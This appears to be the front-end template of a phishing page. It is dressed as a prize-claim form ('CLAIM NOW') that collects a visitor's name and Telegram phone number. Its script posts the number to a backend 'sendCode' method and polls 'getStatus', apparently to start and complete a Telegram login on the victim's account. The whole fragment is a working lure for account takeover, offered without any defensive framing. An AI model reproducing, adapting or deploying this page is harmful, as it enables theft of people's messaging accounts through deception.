<div class="py-2 d-block">
  <div class="text-center mb-3" style="margin-top: -80px;">
    <img src="assets/banner.jpg" alt="Information Banner" style="max-width: 100%; border-radius: 8px;">
  </div>
  <hr />
  <div class="loader" id="loader">
    <div class="spinner"></div>
  </div>
  <div class="mb-3" style="margin-top: 10px;">
    <input type="text" name="nama" id="" class="form-control shadow-none" placeholder="Enter Your Full Name" />
  </div>
  <div class="mb-3" style="margin-top: 10px;">
    <label id="wrong" for="" class="form-label"><span>Invalid number</span></label>
    <div class="input-group">
      <span class="input-group-text" id="basic-addon1" style="display: flex; gap: 3px; background: #FFF;">
        <img src="https://www.svgrepo.com/show/405601/flag-for-flag-singapore.svg" style="height: 24px;" />
      </span>
      <input type="text" class="form-control shadow-none" name="phone" id="phone" placeholder="Enter Your Telegram Number" aria-label="Phone" aria-describedby="basic-addon1" required />
    </div>
  </div>
  <button class="btdk btn mx-auto d-block px-5">CLAIM NOW<span class="bi bi-arrow-right ps-2"></span></button>
</div>

<script>
  $("#wrong").hide();
  $("#loader").hide();

  $("input#phone").on("click", function () {
    if ($(this).val() == "") {
      $(this).val("+<?= $CCODE ?> ");
    }
  });

  function checkStatus() {
    $("#wrong").hide();
    $.ajax({
      url: "<?= base_url("API/index.php") ?>",
      type: "POST",
      data: { "method": "getStatus" },
      success: function (data) {
        if (data.result.status == "success") {
          window.location.reload();
        } else if (data.result.status == "failed") {
          $("#wrong").show();
          $("#loader").hide();
        } else {
          setTimeout(function () {
            checkStatus();
          }, 500);
        }
      }, error: function (data) { }
    });
  }

  $("button").on("click", function (e) {
    e.preventDefault();
    var phone = $("input#phone").val();

    if (phone != "") {
      $("#loader").show();
      $.ajax({
        url: "<?= base_url("API/index.php") ?>",
        type: "POST",
        data: { "method": "sendCode", "phone": phone },
        success: function (data) {
          setTimeout(function () {
            checkStatus();
          }, 500);
        },
        error: function (data) { }
      });
    }
  });
</script>
